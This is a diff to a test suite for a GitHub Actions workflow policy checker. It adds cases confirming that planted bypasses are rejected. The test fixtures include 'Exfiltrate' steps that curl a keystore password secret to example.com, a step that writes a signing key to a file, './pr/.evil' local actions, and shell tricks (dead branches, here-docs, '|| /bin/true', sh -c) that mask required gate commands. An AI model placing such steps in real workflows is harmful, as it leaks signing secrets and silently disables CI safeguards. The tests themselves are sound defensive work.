@@ -196,7 +196,7 @@ test('a multiline uses: is normalized and still checked', () => {
   );
 });
 
-test('only commits on the allowlist may run, and local actions are data', () => {
+test('only commits on the allowlist may run, and local actions are rejected', () => {
   const unknown = VALID.replace(`actions/checkout@${CHECKOUT_SHA}`, `some/unknown-action@${CHECKOUT_SHA}`);
   assert.ok(checkWorkflow(unknown, { file: 'example.yml' }).some((finding) => /not on the pinned action allowlist/.test(finding)));
   const wrongSha = VALID.replace(CHECKOUT_SHA, '0'.repeat(40));
@@ -209,11 +209,14 @@ test('only commits on the allowlist may run, and local actions are data', () => 
       `${reference} is rejected`
     );
   }
-  assert.deepEqual(
-    checkWorkflow(VALID.replace(`uses: actions/checkout@${CHECKOUT_SHA}`, 'uses: ./.github/actions/local'), { file: 'example.yml' }),
-    [],
-    'a local action is repository data and runs checked-out code by definition'
-  );
+  for (const reference of ['./.github/actions/local', './pr/.evil']) {
+    assert.ok(
+      checkWorkflow(VALID.replace(`uses: actions/checkout@${CHECKOUT_SHA}`, `uses: ${reference}`), { file: 'example.yml' }).some((finding) =>
+        /must not run a local action/.test(finding)
+      ),
+      `${reference} runs repository code and is rejected`
+    );
+  }
 });
 
 test('a checkout never persists credentials', () => {
@@ -332,14 +335,156 @@ test('gate steps are exact commands and cannot be masked', async (t) => {
       ),
       /must not set continue-on-error/,
     ],
-    ['echo replacement', checks.replace('run: npm run test:unit', 'run: echo "npm run test:unit"'), /must run exactly one step containing/],
-    ['missing npm ci', checks.replace('      - name: Install the one dev-only dependency\n        run: npm ci\n', ''), /job "web".*npm ci/],
+    ['echo replacement', checks.replace('run: npm run test:unit', 'run: echo "npm run test:unit"'), /must run exactly these commands/],
+    ['missing npm ci', checks.replace('      - name: Install the one dev-only dependency\n        run: npm ci\n', ''), /must run exactly these commands/],
+    ['missing gate', checks.replace('run: node scripts/check-required.mjs', 'run: echo done'), /must run exactly these commands/],
+    // A dead branch, a here-doc, a pipeline, a subshell, a brace group and a
+    // shell wrapper all execute something other than the registered command.
+    [
+      'dead if',
+      checks.replace(
+        '        run: node scripts/check-required.mjs',
+        '        run: |\n          if false; then\n            node scripts/check-required.mjs\n          fi'
+      ),
+      /gate step must run only the registered commands|must run exactly these commands/,
+    ],
+    [
+      'here-doc',
+      checks.replace(
+        '        run: node scripts/check-required.mjs',
+        "        run: |\n          cat > /dev/null <<'EOF'\n          node scripts/check-required.mjs\n          EOF"
+      ),
+      /gate step must run only the registered commands|must run exactly these commands/,
+    ],
+    ['pipe cat', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs | cat'), /gate step must run only the registered commands|must run exactly these commands/],
+    ['path true', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || /bin/true'), /gate step must run only the registered commands|must run exactly these commands/],
+    ['subshell', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || (exit 0)'), /gate step must run only the registered commands|must run exactly these commands/],
+    ['brace group', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || { true; }'), /gate step must run only the registered commands|must run exactly these commands/],
+    ['sh -c', checks.replace('run: node scripts/check-required.mjs', "run: node scripts/check-required.mjs || sh -c 'exit 0'"), /gate step must run only the registered commands|must run exactly these commands/],
+    ['redirection', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs > /dev/null'), /gate step must run only the registered commands|must run exactly these commands/],
   ];
   for (const [name, text, pattern] of cases) {
     const findings = checkWorkflow(text, { file: 'checks.yml' });
     assert.ok(findings.some((finding) => pattern.test(finding)), `${name}: ${findings.join(' | ')}`);
     assert.notEqual(await runPolicy(t, { ...files, 'checks.yml': text }), 0, `${name}: the CLI exits nonzero`);
   }
+});
+
+test('only release.yml sign may use the release environment or read a secret', async (t) => {
+  const files = await real();
+  const checks = files['checks.yml'];
+  const release = files[RELEASE_FILE];
+  const cases = [
+    ['web environment', 'checks.yml', checks.replace('  web:\n', '  web:\n    environment: release\n')],
+    ['policy environment', 'checks.yml', checks.replace('  policy:\n', '  policy:\n    environment: release\n')],
+    [
+      'new job environment',
+      'checks.yml',
+      checks.replace(
+        '  required:\n',
+        '  steal:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    environment: release\n    steps:\n      - run: echo steal\n  required:\n'
+      ),
+    ],
+    ['publish environment', RELEASE_FILE, release.replace('  publish:\n    name: publish', '  publish:\n    environment: release\n    name: publish')],
+    [
+      'web secret in run',
+      'checks.yml',
+      checks.replace(
+        '      - name: Privacy gate\n        run: npm run privacy:check',
+        '      - name: Exfiltrate\n        run: curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/\n      - name: Privacy gate\n        run: npm run privacy:check'
+      ),
+    ],
+    [
+      'policy secret in run',
+      'checks.yml',
+      checks.replace(
+        '      - name: Workflow policy and privacy on the candidate tree',
+        '      - name: Exfiltrate\n        run: curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/\n      - name: Workflow policy and privacy on the candidate tree'
+      ),
+    ],
+    [
+      'build secret in run',
+      RELEASE_FILE,
+      release.replace(
+        '        run: npm run verify:all',
+        '        run: npm run verify:all && curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/'
+      ),
+    ],
+  ];
+  for (const [name, file, text] of cases) {
+    const findings = checkWorkflow(text, { file });
+    assert.ok(
+      findings.some((finding) => /must not use the release environment|must not read secrets/.test(finding)),
+      `${name}: ${findings.join(' | ')}`
+    );
+    assert.notEqual(await runPolicy(t, { ...files, [file]: text }), 0, `${name}: the CLI exits nonzero`);
+  }
+
+  // The one real grant stays: sign uses the release environment and secrets.
+  const sign = parseWorkflow(release).workflow.jobs.sign;
+  assert.equal(sign.environment, 'release');
+  assert.match(JSON.stringify(sign), /secrets\.ANDROID_KEYSTORE_BASE64/);
+  assert.equal(await runPolicy(t, files), 0, 'the real tree is the positive control');
+});
+
+test('the trusted jobs run no local action and the owned workflow set is closed', async (t) => {
+  const files = await real();
+  const checks = files['checks.yml'];
+  for (const [job, anchor, replacement] of [
+    [
+      'policy',
+      '      - name: Workflow policy and privacy on the candidate tree',
+      '      - name: Evil\n        uses: ./pr/.evil\n      - name: Workflow policy and privacy on the candidate tree',
+    ],
+    ['required', '      - name: Every leg must have succeeded', '      - name: Evil\n        uses: ./.evil\n      - name: Every leg must have succeeded'],
+  ]) {
+    const text = checks.replace(anchor, replacement);
+    assert.ok(
+      checkWorkflow(text, { file: 'checks.yml' }).some((finding) => /must not run a local action/.test(finding)),
+      `${job} rejects a local action`
+    );
+    assert.notEqual(await runPolicy(t, { ...files, 'checks.yml': text }), 0, `${job}: the CLI exits nonzero`);
+  }
+
+  const secondRelease = `name: Release Again
+on:
+  workflow_run:
+    workflows: [Checks]
+    types: [completed]
+permissions:
+  contents: write
+  id-token: write
+concurrency:
+  group: release
+  cancel-in-progress: false
+jobs:
+  sign:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    environment: release
+    steps:
+      - name: Checkout
+        uses: actions/checkout@${CHECKOUT_SHA}
+        with:
+          persist-credentials: false
+      - name: Steal
+        run: |
+          printf '%s' "\${{ secrets.ANDROID_KEYSTORE_BASE64 }}" > key.b64
+          gh release create v1.0.3 --generate-notes
+`;
+  assert.notEqual(await runPolicy(t, { ...files, 'release.yaml': secondRelease }), 0, 'a second release workflow fails');
+  assert.notEqual(
+    await runPolicy(t, {
+      ...files,
+      'steal.yml': 'name: Steal\non: push\npermissions:\n  contents: read\nconcurrency:\n  group: steal\njobs:\n  steal:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - run: echo steal\n',
+    }),
+    0,
+    'an unowned workflow fails'
+  );
+  const rest = { ...files };
+  delete rest['stale.yml'];
+  assert.notEqual(await runPolicy(t, rest), 0, 'a missing owned workflow fails');
+  assert.equal(await runPolicy(t, files), 0, 'the exact owned set passes');
 });
 
 test('the release parser reads one real publish command and rejects decoys', async () => {
@@ -574,6 +719,36 @@ test('every planted bypass exits nonzero and the real tree passes', async (t) =>
     },
     'or true': { 'checks.yml': checks.replace('run: npm run test:unit', 'run: npm run test:unit || true') },
     'semicolon true': { 'checks.yml': checks.replace('run: npm run test:unit', 'run: npm run test:unit; true') },
+    'dead if': {
+      'checks.yml': checks.replace(
+        '        run: node scripts/check-required.mjs',
+        '        run: |\n          if false; then\n            node scripts/check-required.mjs\n          fi'
+      ),
+    },
+    'here-doc': {
+      'checks.yml': checks.replace(
+        '        run: node scripts/check-required.mjs',
+        "        run: |\n          cat > /dev/null <<'EOF'\n          node scripts/check-required.mjs\n          EOF"
+      ),
+    },
+    'pipe cat': { 'checks.yml': checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs | cat') },
+    'path true': { 'checks.yml': checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || /bin/true') },
+    'environment release on web': { 'checks.yml': checks.replace('  web:\n', '  web:\n    environment: release\n') },
+    'secret in a non-sign run': {
+      'checks.yml': checks.replace(
+        '      - name: Workflow policy and privacy on the candidate tree',
+        '      - name: Exfiltrate\n        run: curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/\n      - name: Workflow policy and privacy on the candidate tree'
+      ),
+    },
+    'local action in policy': {
+      'checks.yml': checks.replace(
+        '      - name: Workflow policy and privacy on the candidate tree',
+        '      - name: Evil\n        uses: ./pr/.evil\n      - name: Workflow policy and privacy on the candidate tree'
+      ),
+    },
+    'second release workflow': {
+      'release.yaml': `name: Release Again\non:\n  workflow_run:\n    workflows: [Checks]\n    types: [completed]\npermissions:\n  contents: write\nconcurrency:\n  group: release\n  cancel-in-progress: false\njobs:\n  sign:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 30\n    environment: release\n    steps:\n      - run: echo "\${{ secrets.ANDROID_KEYSTORE_BASE64 }}"\n`,
+    },
     'continue-on-error': {
       'checks.yml': checks.replace(
         '      - name: Unit test suite (the browser suites have their own job)\n        run: npm run test:unit',
